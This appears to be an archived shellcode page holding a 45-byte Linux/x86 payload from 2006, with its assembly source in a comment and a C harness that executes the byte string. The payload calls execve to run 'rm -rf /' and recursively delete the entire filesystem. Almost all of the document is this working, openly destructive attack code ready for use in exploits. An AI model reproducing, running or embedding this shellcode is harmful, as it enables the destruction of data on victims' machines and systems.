<html><head><title>Linux/x86 - execve(\\\&quot;rm -rf /\\\&quot;) - 45 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* By Kris Katterjohn 11/18/2006
 *
 * 45 byte shellcode to execve(&quot;rm -rf /&quot;) for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; execve(&quot;/bin/rm&quot;, { &quot;/bin/rm&quot;, &quot;-r&quot;, &quot;-f&quot;, &quot;/&quot;, NULL }, NULL)
 *
 *      push byte 11
 *      pop eax
 *      cdq
 *      push edx
 *      push byte 0x2f
 *      mov edi, esp
 *      push edx
 *      push word 0x662d
 *      mov esi, esp
 *      push edx
 *      push word 0x722d
 *      mov ecx, esp
 *      push edx
 *      push 0x6d722f2f
 *      push 0x6e69622f
 *      mov ebx, esp
 *      push edx
 *      push edi
 *      push esi
 *      push ecx
 *      push ebx
 *      mov ecx, esp
 *      int 0x80
 */

main()
{
       char shellcode[] =
               &quot;\x6a\x0b\x58\x99\x52\x6a\x2f\x89\xe7\x52\x66\x68\x2d\x66\x89&quot;
               &quot;\xe6\x52\x66\x68\x2d\x72\x89\xe1\x52\x68\x2f\x2f\x72\x6d\x68&quot;
               &quot;\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\xcd\x80&quot;;

       (*(void (*)()) shellcode)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
